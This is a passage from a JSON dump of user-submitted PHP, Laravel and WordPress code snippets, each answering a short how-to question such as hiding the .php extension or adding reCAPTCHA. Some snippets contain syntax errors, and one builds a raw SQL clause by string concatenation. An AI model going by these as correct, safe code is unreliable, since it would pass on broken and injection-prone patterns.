    "description": "function hex2rgba($color, $opacity = false) {   \t$default = 'rgb(0,0,0)';   \t//Return default if no color provided \tif(empty($color))           return $default;    \t//Sanitize $color if \"#\" is provided          if ($color[0] == '#' ) {         \t$color = substr( $color, 1 );         }           //Check if color has 6 or 3 characters and get values         if (strlen($color) == 6) {                 $hex = array( $color[0] . $color[1], $color[2] . $color[3], $color[4] . $color[5] );         } elseif ( strlen( $color ) == 3 ) {                 $hex = array( $color[0] . $color[0], $color[1] . $color[1], $color[2] . $color[2] );         } else {                 return $default;         }           //Convert hexadec to rgb         $rgb =  array_map('hexdec', $hex);           //Check if opacity is set(rgba or rgb)         if($opacity){         \tif(abs($opacity) > 1)         \t\t$opacity = 1.0;         \t$output = 'rgba('.implode(\",\",$rgb).','.$opacity.')';         } else {         \t$output = 'rgb('.implode(\",\",$rgb).')';         }           //Return rgb(a) color string         return $output; }\n",
    "reg_date": "2021-10-12T10:14:31.000Z"
  },
  {
    "id": 1461,
    "keyword": null,
    "link": null,
    "title": " hide .php from url .htaccess",
    "description": "# Apache Rewrite Rules  <IfModule mod_rewrite.c>   Options +FollowSymLinks   RewriteEngine On   RewriteBase /  # Add trailing slash to url   RewriteCond %{REQUEST_FILENAME} !-f   RewriteCond %{REQUEST_URI} !(\\.[a-zA-Z0-9]{1,5}|/|#(.*))$   RewriteRule ^(.*)$ $1/ [R=301,L]  # Remove .php-extension from url   RewriteCond %{REQUEST_FILENAME} !-d   RewriteCond %{REQUEST_FILENAME}\\.php -f   RewriteRule ^([^\\.]+)/$ $1.php   # End of Apache Rewrite Rules  </IfModule> \n# Run Php without filename extension RewriteEngine on RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME}.php -f RewriteRule ^(.*)$ $1.php  # Return 404 if original request is .php RewriteCond %{THE_REQUEST} \"^[^ ]* .*?\\.php[? ].*$\" RewriteRule .* - [L,R=404]\n",
    "reg_date": "2021-10-12T10:14:31.000Z"
  },
  {
    "id": 1462,
    "keyword": null,
    "link": null,
    "title": " hide add new link on cpt page",
    "description": "// Simply pass the the parameter 'create_posts' => 'do_not_allow', // in the capabilities array when calling register_post_type.  'capabilities' => array(     'create_posts' => 'do_not_allow' )\n",
    "reg_date": "2021-10-12T10:14:31.000Z"
  },
  {
    "id": 1463,
    "keyword": null,
    "link": null,
    "title": " hide php extension htaccess",
    "description": "RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^([^\\.]+)$ $1.php [NC,L] \nRewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^([^/]+)/$ $1.php RewriteRule ^([^/]+)/([^/]+)/$ /$1/$2.php RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_URI} !(\\.[a-zA-Z0-9]{1,5}|/)$ RewriteRule (.*)$ /$1/ [R=301,L]  #This works with xxx/index.php too (visiting mysite.com/xxx/)\n# Apache Rewrite Rules  <IfModule mod_rewrite.c>   Options +FollowSymLinks   RewriteEngine On   RewriteBase /  # Add trailing slash to url   RewriteCond %{REQUEST_FILENAME} !-f   RewriteCond %{REQUEST_URI} !(\\.[a-zA-Z0-9]{1,5}|/|#(.*))$   RewriteRule ^(.*)$ $1/ [R=301,L]  # Remove .php-extension from url   RewriteCond %{REQUEST_FILENAME} !-d   RewriteCond %{REQUEST_FILENAME}\\.php -f   RewriteRule ^([^\\.]+)/$ $1.php   # End of Apache Rewrite Rules  </IfModule> \n",
    "reg_date": "2021-10-12T10:14:31.000Z"
  },
  {
    "id": 1464,
    "keyword": null,
    "link": null,
    "title": " hide php extension in url",
    "description": "Options +MultiViews RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^([^\\.]+)$ $1.php [NC,L] \n# Run Php without filename extension RewriteEngine on RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME}.php -f RewriteRule ^(.*)$ $1.php  # Return 404 if original request is .php RewriteCond %{THE_REQUEST} \"^[^ ]* .*?\\.php[? ].*$\" RewriteRule .* - [L,R=404]\n",
    "reg_date": "2021-10-12T10:14:31.000Z"
  },
  {
    "id": 1465,
    "keyword": null,
    "link": null,
    "title": " hide wordpress errors",
    "description": "/* provided by joshiyogesh0333@gmail.com */ /* add in config file  */ define( 'WP_DEBUG', false ); define( 'WP_DEBUG_LOG', false ); define( 'WP_DEBUG_DISPLAY', false ); define( 'SCRIPT_DEBUG', false ); define( 'SAVEQUERIES', false );  /* add in function.php file  */  ini_set('display_errors', 0); ini_set('display_startup_errors', 0); error_reporting(0);\nini_set('display_errors','Off'); ini_set('error_reporting', E_ALL ); define('WP_DEBUG', false); define('WP_DEBUG_DISPLAY', false); \nini_set('display_errors','Off'); ini_set('error_reporting', E_ALL ); define('WP_DEBUG', false); define('WP_DEBUG_DISPLAY', false);  #https://www.fiverr.com/tamerjarrar\n",
    "reg_date": "2021-10-12T10:14:31.000Z"
  },
  {
    "id": 1466,
    "keyword": null,
    "link": null,
    "title": " hide wp admin bar for subscribers",
    "description": "add_action('after_setup_theme', 'remove_admin_bar');   function remove_admin_bar() { if (!current_user_can('administrator') && !is_admin()) {   show_admin_bar(false); } } \n/*  * Add this to the bottom of your functions.php file to hide the wp admin * bar for all users except those whom can edit posts. */  add_action('set_current_user', 'cc_hide_admin_bar'); function cc_hide_admin_bar() {   if (!current_user_can('edit_posts')) {     show_admin_bar(false);   } }\n",
    "reg_date": "2021-10-12T10:14:32.000Z"
  },
  {
    "id": 1467,
    "keyword": null,
    "link": null,
    "title": " highlight search text in php",
    "description": "function highlightWords($text, $word){     $text = preg_replace('#'. preg_quote($word) .'#i', '<span style=\"background-color: #F9F902;\">\\\\0</span>', $text);     return $text; }  //function calling highlightWords($desc, $search_word);\n",
    "reg_date": "2021-10-12T10:14:32.000Z"
  },
  {
    "id": 1468,
    "keyword": null,
    "link": null,
    "title": " hit a simple url using curl in php",
    "description": "  <?php   ob_start();   $ch = curl_init();   curl_setopt($ch, CURLOPT_URL,'https://example.com/student_list.php');   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);   $response = curl_exec($ch);   echo $response;   ?>\n",
    "reg_date": "2021-10-12T10:14:32.000Z"
  },
  {
    "id": 1469,
    "keyword": null,
    "link": null,
    "title": " home': couldn't find login name -- expanding `~' (ArgumentError)",
    "description": "Search your php.ini with this commands: php --ini  For Me:  Loaded Configuration File: /etc/php/7.2/cli/php.ini  In your php.ini file, set variables_order = \"EGPCS\".\n",
    "reg_date": "2021-10-12T10:14:32.000Z"
  },
  {
    "id": 1470,
    "keyword": null,
    "link": null,
    "title": " home url wordpress",
    "description": "$url = home_url(); echo $url; // Output: http://www.example.com  $url = home_url( '/' ); echo $url; // Output: http://www.example.com/  $url = home_url( $path = '/', $scheme = 'https' ); echo $url; // Output: https://www.example.com/  $url = home_url( $path = 'example', $scheme = 'relative' ); echo $url; // Output: /example\n//It is possible to set the site URL manually in the wp-config.php file.  //Add these two lines to your wp-config.php, where &ldquo;example.com&rdquo; is the correct location of your site.  define( 'WP_HOME', 'http://example.com' ); define( 'WP_SITEURL', 'http://example.com' );  //Important! Do not leave this code in the functions.php file. Remove them after the site is up and running again.  update_option( 'siteurl', 'http://example.com' ); update_option( 'home', 'http://example.com' );\n",
    "reg_date": "2021-10-12T10:14:32.000Z"
  },
  {
    "id": 1471,
    "keyword": null,
    "link": null,
    "title": " homebrew switch php version",
    "description": "brew unlink php@7.4 brew link php@7.3 \n$ brew unlink php@7.4 $ brew link php@8.0 --force --overwrite\n",
    "reg_date": "2021-10-12T10:14:32.000Z"
  },
  {
    "id": 1472,
    "keyword": null,
    "link": null,
    "title": " how-to-increase-maximum-upload-file-size-in-wordpress",
    "description": "1. Update .htaccess file    php_value upload_max_filesize 128M   php_value post_max_size 128M   php_value memory_limit 256M   php_value max_execution_time 300   php_value max_input_time 300  Change the numbers to the values that you need. The max execution time and max  input time values are in seconds and might need to be increased further if  your internet connection is slow.  2. Update wp-config.php file    @ini_set( 'upload_max_filesize' , '128M' );   @ini_set( 'post_max_size', '128M');   @ini_set( 'memory_limit', '256M' );   @ini_set( 'max_execution_time', '300' );   @ini_set( 'max_input_time', '300' );  reference :  https://help.servmask.com/2018/10/27/how-to-increase-maximum-upload-file-size-in-wordpress/\n",
    "reg_date": "2021-10-12T10:14:32.000Z"
  },
  {
    "id": 1473,
    "keyword": null,
    "link": null,
    "title": " how add confirmation box in php before deleting",
    "description": "echo \"<td><a onClick=\\\"javascript: return confirm('Please confirm deletion');\\\" href='delete.php?id=\".$query2['id'].\"'>x</a></td><tr>\"; //use double quotes for js inside php!\n",
    "reg_date": "2021-10-12T10:14:32.000Z"
  },
  {
    "id": 1474,
    "keyword": null,
    "link": null,
    "title": " how can set defult value for yield in laravel",
    "description": "@yield('sidebar', 'Default Content');\n",
    "reg_date": "2021-10-12T10:14:32.000Z"
  },
  {
    "id": 1475,
    "keyword": null,
    "link": null,
    "title": " how can we check in the table in comma separated values in laravel",
    "description": "$search = 1; $data = \\DB::table(\"myposts\")     ->select(\"myposts.*\")     ->whereRaw(\"find_in_set('\".$search.\"',myposts.tags)\")     ->get();\n",
    "reg_date": "2021-10-12T10:14:33.000Z"
  },
  {
    "id": 1476,
    "keyword": null,
    "link": null,
    "title": " how change the languge of fie manager in laravel",
    "description": "step 1 ) After creating the directory  step 2 )go to config/app.php and change the entire   local language for the project as follow :  step 3 ) 'locale' => 'your_language',\n",
    "reg_date": "2021-10-12T10:14:33.000Z"
  },
  {
    "id": 1477,
    "keyword": null,
    "link": null,
    "title": " how check if variable is resgister in laravel",
    "description": "        if(!isset($user_id)){             throw new \\Exception('your message');         }\n",
    "reg_date": "2021-10-12T10:14:33.000Z"
  },
  {
    "id": 1478,
    "keyword": null,
    "link": null,
    "title": " how check the online user in laravel",
    "description": "//1 - the first step make middleware  public function handle($request, Closure $next)     {         if(Auth::check()) {             $expiresAt = Carbon::now()->addMinutes(1);             Cache::put('user-is-online-' . Auth::user()->id, true, $expiresAt);         }         return $next($request);     }  // the second step is add a class into Kernel  //the third step is add a function into the User Model public function isOnline() {     return Cache::has('user-is-online-' . $this->id); }  //the last step is check user Online or offline in Laravel application @if($user->isOnline())     user is online!! @endif\n",
    "reg_date": "2021-10-12T10:14:33.000Z"
  },
  {
    "id": 1479,
    "keyword": null,
    "link": null,
    "title": " how console log laravel",
    "description": "use Illuminate\\Support\\Facades\\Log;  Log::info(\"the message for log\");\nerror_log('Some message here.');\n",
    "reg_date": "2021-10-12T10:14:33.000Z"
  },
  {
    "id": 1480,
    "keyword": null,
    "link": null,
    "title": " how convert the date and time to integer in laravel",
    "description": "$timestamp = $user->created_at->timestamp\n",
    "reg_date": "2021-10-12T10:14:33.000Z"
  },
  {
    "id": 1481,
    "keyword": null,
    "link": null,
    "title": " how copy database from phpmyadmin",
    "description": "1) Select the database you wish to copy (by clicking on the database from the phpMyAdmin home screen). 2) Once inside the database, select the Operations tab. 3) Scroll down to the section where it says \"Copy database to:\" 4) Type in the name of the new database. 5) Select \"structure and data\" to copy everything.  Alternately, you can select \"Structure only\" if you want the columns but not the data. 6) Check the box \"CREATE DATABASE before copying\" to create a new database. 7) Check the box \"Add AUTO_INCREMENT value.\" 8) Click on the Go button to proceed.   \n",
    "reg_date": "2021-10-12T10:14:33.000Z"
  },
  {
    "id": 1482,
    "keyword": null,
    "link": null,
    "title": " how create migration in laravel",
    "description": "php artisan make:migration create_users_table \n//to create migration file in PHP use the artisan command \"make\" php artisan make:migration create_users_table // migration file must follow the naming convention \"operation_tableName_table\" //Migration file to add column naming convention would be \"add_tablename_table\"\n",
    "reg_date": "2021-10-12T10:14:33.000Z"
  },
  {
    "id": 1483,
    "keyword": null,
    "link": null,
    "title": " how create new command in laravel",
    "description": "php artisan make:command SendEmails\nphp artisan make:command SendEmail\nphp artisan make:command CommandName\n/**  * The name and signature of the console command.  *  * @var string  */ protected $signature = 'email:send {user} {--queue}';\nphp artisan email:send 1 --queue\n",
    "reg_date": "2021-10-12T10:14:33.000Z"
  },
  {
    "id": 1484,
    "keyword": null,
    "link": null,
    "title": " how create page 419 in laravel",
    "description": "There is a way to override this view. All you need to do is  create 419.blade.php file inside the resources/views/errors folder.  If you need to find the Laravel`s default 419.blade.php file , you can publish   vendor files:  php artisan vendor:publish --tag=laravel-errors\n",
    "reg_date": "2021-10-12T10:14:33.000Z"
  },
  {
    "id": 1485,
    "keyword": null,
    "link": null,
    "title": " how delete the table in laravel in the commend",
    "description": "php artisan migrate:reset \n",
    "reg_date": "2021-10-12T10:14:33.000Z"
  },
  {
    "id": 1486,
    "keyword": null,
    "link": null,
    "title": " how do decode base64 php",
    "description": "base64_decode('base64');\nbase64_decode('base64-string-goes-here');\n<?php     // Program to illustrate base64_decode()  // function  $str = 'R0ZHLCBBIGNvbXB1dGVyIFNjaWVuY2UgUG9ydGFsIEZvciBHZWVrcw';  echo base64_decode($str). \"\\n\";     $str = 'MQ==';  echo base64_decode($str). \"\\n\";  ?>  \n",
    "reg_date": "2021-10-12T10:14:34.000Z"
  },
  {
    "id": 1487,
    "keyword": null,
    "link": null,
    "title": " how do i open a new tab with php",
    "description": "<a href=\"https://www.google.com/\" target=\"_blank\">Click here</a> \n",
    "reg_date": "2021-10-12T10:14:34.000Z"
  },
  {
    "id": 1488,
    "keyword": null,
    "link": null,
    "title": " how get all files name in one folder in laravel",
    "description": "        $filesName = \\File::files(base_path().'\\database\\migrations\\\\');         $arr = [];         foreach ($filesName as $file) {             $ex = explode(\"\\\\\"  , $file);             array_push($arr , $ex[count($ex) - 1]);         }\n",
    "reg_date": "2021-10-12T10:14:34.000Z"
  },
  {
    "id": 1489,
    "keyword": null,
    "link": null,
    "title": " how get file size in laravel",
    "description": "$size = $request->file(\"image\")->getSize();\nuse Illuminate\\Support\\Facades\\Storage;  $size = Storage::size('public/'.$picture->filename'); \n$size = $request->file('file')->getClientSize();\n",
    "reg_date": "2021-10-12T10:14:34.000Z"
  },
  {
    "id": 1490,
    "keyword": null,
    "link": null,
    "title": " how get just one parameter of all objects in one array in laravel",
    "description": "$patients_id = FollowUpQuestionsAfterSurgery:: orderBy('id' , 'desc') ->pluck(\"patient_id\");  $patients = Paitent::whereIn(\"id\" , $patients_id)->get()->->toArray();   return array_column($patients , \"follow_up\"); \n",
    "reg_date": "2021-10-12T10:14:34.000Z"
  },
  {
    "id": 1491,
    "keyword": null,
    "link": null,
    "title": " how get last item in foreach in laravel",
    "description": "$loop->last  @foreach ($colors as $k => $v)      @if($loop->last)          // at last loop, code here      @endif @endforeach \n",
    "reg_date": "2021-10-12T10:14:34.000Z"
  },
  {
    "id": 1492,
    "keyword": null,
    "link": null,
    "title": " how get query from url in laravel",
    "description": "$name = $request->query('name');\nRoute::get('mohamad' , function (\\Illuminate\\Http\\Request $request){     return $request->query('name'); });\n",
    "reg_date": "2021-10-12T10:14:34.000Z"
  },
  {
    "id": 1493,
    "keyword": null,
    "link": null,
    "title": " how get the  Photo size upload in laravel",
    "description": "$request->file('image')->getSize()\nuse Illuminate\\Support\\Facades\\Storage;  $size = Storage::size('public/'.$picture->filename'); \n$size = $request->file('file')->getClientSize();\n",
    "reg_date": "2021-10-12T10:14:34.000Z"
  },
  {
    "id": 1494,
    "keyword": null,
    "link": null,
    "title": " how get the first item in foreach in laravel",
    "description": "@foreach($items as $item)     @if ($loop->first) First Item: @endif     <h4>{{ $item->program_name }}</h4> @endforeach\n@foreach ($users as $user)     @if ($loop->first)         This is the first iteration.     @endif      @if ($loop->last)         This is the last iteration.     @endif      <p>This is user {{ $user->id }}</p> @endforeach\nFirst Last child laravel blade loop\n",
    "reg_date": "2021-10-12T10:14:35.000Z"
  },
  {
    "id": 1495,
    "keyword": null,
    "link": null,
    "title": " how get the latest arraye value in laravel",
    "description": "$languages = [   'JAVA',   'PHP',   'C++',   'C#',   'Python', ]; $totalElements = count($languages); echo $languages[$totalElements - 1]; \n",
    "reg_date": "2021-10-12T10:14:35.000Z"
  },
  {
    "id": 1496,
    "keyword": null,
    "link": null,
    "title": " how get the latest data in database in laravel",
    "description": "$last = DB::table('items')->latest()->first();  $last2 = DB::table('items')->orderBy('id', 'DESC')->first();\n",
    "reg_date": "2021-10-12T10:14:35.000Z"
  },
  {
    "id": 1497,
    "keyword": null,
    "link": null,
    "title": " how get the photo size upload in laravel",
    "description": "$request->file('image')->getSize()\n request()->validate([             'image' => 'image|mimes:jpeg,png,jpg|max:2048',         ]);\nuse Illuminate\\Support\\Facades\\Storage;  $size = Storage::size('public/'.$picture->filename'); \n   $image = getimagesize($request->image);         $width = $image[0];         $height = $image[1];\n",
    "reg_date": "2021-10-12T10:14:35.000Z"
  },
  {
    "id": 1498,
    "keyword": null,
    "link": null,
    "title": " how handle the number with k in laravel balde",
    "description": "    public function convert($value)     {         $number = $value / 1000;         return $number . 'k';     }\n",
    "reg_date": "2021-10-12T10:14:35.000Z"
  },
  {
    "id": 1499,
    "keyword": null,
    "link": null,
    "title": " how if charactor is exist in text in laravel",
    "description": " $str_contains = $request->birthDay; if(str_contains($request->birthDay , '-')){   return 'this text contains \"-\" charactors'; }elseif(str_contains($request->birthDay , '/')){   return 'this text contains \"/\" charactors'; }\n",
    "reg_date": "2021-10-12T10:14:35.000Z"
  },
  {
    "id": 1500,
    "keyword": null,
    "link": null,
    "title": " how import the impliment countable php",
    "description": "namespace App;  class MyClass implements Countable {     public function count() {     //return count     } }\n",
    "reg_date": "2021-10-12T10:14:35.000Z"
  },
  {
    "id": 1501,
    "keyword": null,
    "link": null,
    "title": " how laravel return the old value",
    "description": "return redirect('form')->withInput();\n",
    "reg_date": "2021-10-12T10:14:35.000Z"
  },
  {
    "id": 1502,
    "keyword": null,
    "link": null,
    "title": " how login one user with id in laravel",
    "description": "use Auth; $user_id = Auth::user()->id; \npublic function manualLogin(){     $user = User::find(1);     Auth::login($user);     return redirect('/'); } /////////////////////////////////////////////////////////////// // or   Auth::logout();\n",
    "reg_date": "2021-10-12T10:14:36.000Z"
  },
  {
    "id": 1503,
    "keyword": null,
    "link": null,
    "title": " how make custom menu in wordpress",
    "description": "function wpb_custom_new_menu() {   register_nav_menus(     array(       'my-custom-menu' => __( 'My Custom Menu' ),       'extra-menu' => __( 'Extra Menu' )     )   ); } add_action( 'init', 'wpb_custom_new_menu' ); \n<?php wp_nav_menu( array(      'theme_location' => 'my-custom-menu',      'container_class' => 'custom-menu-class' ) );  ?> \n",
    "reg_date": "2021-10-12T10:14:36.000Z"
  },
  {
    "id": 1504,
    "keyword": null,
    "link": null,
    "title": " how make exception laravel if operation does not work",
    "description": "        if(!isset($user_id)){             throw new \\Exception('your message');         }\n",
    "reg_date": "2021-10-12T10:14:36.000Z"
  },
  {
    "id": 1505,
    "keyword": null,
    "link": null,
    "title": " how many files in dir php",
    "description": "$fi = new FilesystemIterator(__DIR__, FilesystemIterator::SKIP_DOTS); printf(\"There were %d Files\", iterator_count($fi));\n",
    "reg_date": "2021-10-12T10:14:36.000Z"
  },
  {
    "id": 1506,
    "keyword": null,
    "link": null,
    "title": " how push to array whit key in laravel",
    "description": " array_push($arraye , ['title'=>$data['title'] , 'desc'=> $data['desc']]);\n",
    "reg_date": "2021-10-12T10:14:36.000Z"
  },
  {
    "id": 1507,
    "keyword": null,
    "link": null,
    "title": " how refresh the record of data in laravel",
    "description": "$model->refresh();\n",
    "reg_date": "2021-10-12T10:14:36.000Z"
  },
  {
    "id": 1508,
    "keyword": null,
    "link": null,
    "title": " how remember me in laravel working",
    "description": "     $remember_me = $request->has('remember') ? true : false;        if (auth()->attempt(['email' => $request->input('email'), 'password' => $request->input('password')], $remember_me))     {       $user = auth()->user();       Auth::login($user,true);     }else{          return back()->with('error','your username and password are wrong.');      }\n",
    "reg_date": "2021-10-12T10:14:36.000Z"
  },
  {
    "id": 1509,
    "keyword": null,
    "link": null,
    "title": " how remove \\r\\n from string in php",
    "description": "$text = preg_replace(\"/\\r|\\n/\", \"\", $text);\n//Replace the newline and carriage return characters //using regex and preg_replace. $text = preg_replace(\"/\\r|\\n/\", \"\", $text); \n",
    "reg_date": "2021-10-12T10:14:36.000Z"
  },
  {
    "id": 1510,
    "keyword": null,
    "link": null,
    "title": " how remove column in migration laravel",
    "description": "public function up() {   Schema::table('table', function($table) {     $table->dropColumn('column_name');   }); }\n          Schema::table('articles', function($table) {              $table->dropColumn('comment_count');              $table->dropColumn('view_count');           });\n// To drop a column, use the dropColumn method on the schema builder. // Before dropping columns from a SQLite database, you will need to add // the doctrine/dbal dependency to your composer.json file and run the // composer update command in your terminal to install the library:  Schema::table('users', function (Blueprint $table) {     $table->dropColumn('votes'); });\n",
    "reg_date": "2021-10-12T10:14:36.000Z"
  },
  {
    "id": 1511,
    "keyword": null,
    "link": null,
    "title": " how send parameter with command in laravel",
    "description": "1 ) protected $signature = 'testCommand:refresh {name} {option}'; 2 ) php artisan help testCommand:refresh 3 ) Usage:   testCommand:refresh <name> <option> 4 ) public function handle()     {         return $this->info('the name is => '.$this->argument('name'). \" the option is =>\" .$this->argument('option'));     }    \n",
    "reg_date": "2021-10-12T10:14:36.000Z"
  },
  {
    "id": 1512,
    "keyword": null,
    "link": null,
    "title": " how send user to 404 page if not exist page in laravel",
    "description": "//step 1 ) create the errors/404.blade.php in view.  // step 2 ) go to Handler.php and replace the render function to belwo function.   public function render($request, Throwable $exception)     {         if ($exception instanceof AccessDeniedHttpException) {             return response(view('errors.404'), 404);         }         return parent::render($request, $exception);     }\n",
    "reg_date": "2021-10-12T10:14:37.000Z"
  },
  {
    "id": 1513,
    "keyword": null,
    "link": null,
    "title": " how set action with name in form in laravel",
    "description": "<form method=\"POST\" action=\"{{ route('welcome.login') }}\"> </form> \n",
    "reg_date": "2021-10-12T10:14:37.000Z"
  },
  {
    "id": 1514,
    "keyword": null,
    "link": null,
    "title": " how set field after another field in migration in laravel",
    "description": "Schema::table('users', function($table) {     $table->string('phone_nr')->after('id'); }); \nphp artisan make:migration add_store_id_to_users_table --table=users \n",
    "reg_date": "2021-10-12T10:14:37.000Z"
  },
  {
    "id": 1515,
    "keyword": null,
    "link": null,
    "title": " how set variable public in static method in laravel",
    "description": "class ContentController extends BaseController {      public static $text = null;      public static function getContent($description)     {         $content = Content::where('description', $description)->first();         return static::$text = $content->text;     } } \nclass Export extends Model {     public static $itemsPerPage = 20;  \tpublic function test() { \t\tstatic::$itemsPerPage;     } }\n",
    "reg_date": "2021-10-12T10:14:37.000Z"
  },
  {
    "id": 1516,
    "keyword": null,
    "link": null,
    "title": " how tdo you convert a stringto lowercase in php",
    "description": "/* strtolower() function converts  string to lowercase. */ <?php echo strtolower(\"Hello WORLD 123\"); ?> // Output:hello world 123\nstrtolower ( string $string ) : string  //Returns string with all alphabetic characters converted to lowercase. $string = 'HELLO WORLD'; echo strtolower($string); //Output: 'hello world' $string = 'HeLlO WoRlD'; echo strtolower($string); //Output: 'hello world'\nstrtolower ( string $string ) : string  //Returns string with all alphabetic characters converted to lowercase. $string = 'HELLO WORLD'; echo strtolower($string); //Output: 'hello world'\nThe strtolower() function is used to convert a string into lowercase. This function takes a string as parameter and converts all the uppercase english alphabets present in the string to lowercase.\n",
    "reg_date": "2021-10-12T10:14:37.000Z"
  },
  {
    "id": 1517,
    "keyword": null,
    "link": null,
    "title": " how to add an custom error to validater error in laravel",
    "description": "if (request('event') == null) {     $validator->errors()->add('event', 'Please select an event'); }\n",
    "reg_date": "2021-10-12T10:14:37.000Z"
  },
  {
    "id": 1518,
    "keyword": null,
    "link": null,
    "title": " how to add extra days from a date php",
    "description": "<?php  // PHP program to add days to $Date     // Declare a date  $date = \"2019-05-10\";     // Add days to date and display it  echo date('Y-m-d', strtotime($date. ' + 10 days'));     ?> \n<?php   // adding extra days to date       // Steps: \t// 1) using carbon     // 2) using strtotime            //Step 1   $date = date('Y M d h:i:s') // 2020 09 22 22:09:26 UTC      $new_date = Carbon::parse($date->addDays(1); // adds extra day                                // Step 2   $date = date('Y M d h:i:s') // 2020 09 22 22:09:26 UTC      echo $new_date = date('Y M d h:i:s', strtotime($date. '+1 day')); ?>\n",
    "reg_date": "2021-10-12T10:14:37.000Z"
  },
  {
    "id": 1519,
    "keyword": null,
    "link": null,
    "title": " how to add hour minute seconds in php datetime",
    "description": "date('Y-m-d H:i',strtotime('+1 hour +20 minutes',strtotime($start)));\n<?php  $date = new DateTime(); echo $date->getTimestamp(). \"<br>\"; $date->add(new DateInterval('PT674165S')); // adds 674165 secs echo $date->getTimestamp(); ?>\n$minutes_to_add = 5;  $time = new DateTime('2011-11-17 05:05'); $time->add(new DateInterval('PT' . $minutes_to_add . 'M'));  $stamp = $time->format('Y-m-d H:i');\n",
    "reg_date": "2021-10-12T10:14:37.000Z"
  },
  {
    "id": 1520,
    "keyword": null,
    "link": null,
    "title": " how to add php 7.4 in homebrew",
    "description": "brew install php@7.4\n",
    "reg_date": "2021-10-12T10:14:37.000Z"
  },
  {
    "id": 1521,
    "keyword": null,
    "link": null,
    "title": " how to add recaptcha to woocommerce register php",
    "description": "// Add field into the registration form      function nada_woocommerce_edit_registration_form() {             ?>             <p id=\"recaptcha\" class=\"g-recaptcha\" data-sitekey=\"##your-google-captcha-key##\"></p>             <?php         }         add_action( 'woocommerce_register_form', 'nada_woocommerce_edit_registration_form', 15 );      /**      * Validate Woocommerce Registration form fields      */      function nada_validate_extra_register_fields( $errors, $username, $email ) {         if ( empty( $_POST['g-recaptcha-response'] ) ) {                 $errors->add( 'captcha-error', wp_kses_post( '<strong>Error</strong>: Captcha is missing.', 'nada' ) );         }         return $errors;     }     add_filter( 'woocommerce_registration_errors', 'nada_validate_extra_register_fields', 10, 3 );\nfunction wooc_validate_re_captcha_field( $username, $email, $wpErrors ) {     $remoteIP = $_SERVER['REMOTE_ADDR'];     $recaptchaResponse = $_POST['g-recaptcha-response'];      $response = wp_remote_post( 'https://www.google.com/recaptcha/api/siteverify', [         'body' => [             'secret'   => 'PRIVATE KEY HERE !!!',             'response' => $recaptchaResponse,             'remoteip' => $remoteIP         ]     ] );      $response_code = wp_remote_retrieve_response_code( $response );     $response_body = wp_remote_retrieve_body( $response );      if ( $response_code == 200 )     {         $result = json_decode( $response_body, true );          if ( ! $result['success'] )         {             switch ( $result['error-codes'] )             {                 case 'missing-input-secret':                 case 'invalid-input-secret':                     $wpErrors->add( 'recaptcha', __( '<strong>ERROR</strong>: Invalid reCAPTCHA secret key.', 'woocommerce' ) );                     break;                  case 'missing-input-response' :                 case 'invalid-input-response' :                     $wpErrors->add( 'recaptcha', __( '<strong>ERROR</strong>: Please check the box to prove that you are not a robot.', 'woocommerce' ) );                     break;                  default:                     $wpErrors->add( 'recaptcha', __( '<strong>ERROR</strong>: Something went wront validating the reCAPTCHA.', 'woocommerce' ) );                     break;             }         }     }     else     {         $wpErrors->add( 'recaptcha_error', __( '<strong>Error</strong>: Unable to reach the reCAPTCHA server.', 'woocommerce' ) );     } } add_action( 'woocommerce_register_post', 'wooc_validate_re_captcha_field', 10, 3 );\n",
    "reg_date": "2021-10-12T10:14:37.000Z"
  },
  {
    "id": 1522,
    "keyword": null,
    "link": null,
    "title": " how to add recaptcha validation in php",
    "description": "index.html  <html>   <head>     <title>Google recapcha demo - Codeforgeek</title>     <script src='https://www.google.com/recaptcha/api.js'></script>   </head>   <body>     <h1>Google reCAPTHA Demo</h1>     <form id=\"comment_form\" action=\"form.php\" method=\"post\">       <input type=\"email\" placeholder=\"Type your email\" size=\"40\"><br><br>       <textarea name=\"comment\" rows=\"8\" cols=\"39\"></textarea><br><br>       <input type=\"submit\" name=\"submit\" value=\"Post comment\"><br><br>       <div class=\"g-recaptcha\" data-sitekey=\"=== Your site key ===\"></div>     </form>   </body> </html> verify.php  <?php     $email; $comment; $captcha;      if(isset($_POST['email']))         $email=$_POST['email'];     if(isset($_POST['comment']))         $comment=$_POST['comment'];     if(isset($_POST['g-recaptcha-response']))         $captcha=$_POST['g-recaptcha-response'];      if(!$captcha){         echo '<h2>Please check the the captcha form.</h2>';         exit;     }      $response = json_decode(file_get_contents(\"https://www.google.com/recaptcha/api/siteverify?secret=YOUR SECRET KEY&response=\".$captcha.\"&remoteip=\".$_SERVER['REMOTE_ADDR']), true);     if($response['success'] == false)     {         echo '<h2>You are spammer ! Get the @$%K out</h2>';     }     else     {         echo '<h2>Thanks for posting comment.</h2>';     } ?>\n",
    "reg_date": "2021-10-12T10:14:38.000Z"
  },
  {
    "id": 1523,
    "keyword": null,
    "link": null,
    "title": " how to add title to wordpress php",
    "description": "// For website name in <title> tag <?php wp_title(); ?>    // For the Post title within the loop <?php the_title(); ?>\n",
    "reg_date": "2021-10-12T10:14:38.000Z"
  },
  {
    "id": 1524,
    "keyword": null,
    "link": null,
    "title": " how to add two array in single array without repetation in php",
    "description": "<?php \t$array1=array(\"CPU\",\"Mouse\",\"Monitor\"); \t$array2=array(\"Key-Board\",\"Monitor\",\"Printer\"); \t$array = array_unique(array_merge($array1, $array2)); \tprint_r($array); ?> \n",
    "reg_date": "2021-10-12T10:14:38.000Z"
  },
  {
    "id": 1525,
    "keyword": null,
    "link": null,
    "title": " how to add values to an array in laravel",
    "description": "$array = array('foo' => 'bar');  $array = array_add($array, 'key', 'value');\n <?php $stack = array(\"orange\", \"banana\"); array_push($stack, \"apple\", \"raspberry\"); ?>  \n",
    "reg_date": "2021-10-12T10:14:38.000Z"
  },
  {
    "id": 1526,
    "keyword": null,
    "link": null,
    "title": " how to add woocommerce cart counter",
